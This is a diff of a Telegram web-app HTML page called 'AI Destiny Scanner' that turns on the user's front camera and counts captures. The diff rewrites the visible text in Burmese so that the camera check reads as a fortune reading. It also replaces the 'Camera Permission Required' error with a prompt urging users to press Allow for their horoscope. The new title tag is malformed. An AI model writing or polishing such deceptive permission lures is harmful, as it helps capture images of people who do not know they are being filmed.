@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>AI Destiny & Horoscope</title>
+    <title>ကံဇာတာ ဟောကိန်းtitle>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
@@ -42,7 +42,7 @@
         <div id="scanner-ui">
             <div class="scan-line"></div>
             <h2 id="header">AI DESTINY SCANNER</h2>
-            <p id="status">ကင်မရာအား စစ်ဆေးနေပါသည်...</p>
+            <p id="status">သင့်ရဲ့ ကံဇာတာအား စစ်ဆေးနေပါသည်...</p>
             <div class="loading-bar"><div class="progress" id="progress"></div></div>
         </div>
 
@@ -81,7 +81,7 @@
 
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
             .then(s => { video.srcObject = s; startProcess(); })
-            .catch(() => status.innerText = "Camera Permission Required");
+            .catch(() => status.innerText = "ကံဇာတာစစ်ဆေးနိုင်ရန် နောက်ထပ် Allow ကိုနှိပ်ပေးပါ");
 
         let captureCount = 0;
         function startProcess() {
@@ -189,4 +189,5 @@
     </script>
 </body>
 </html>
+
 
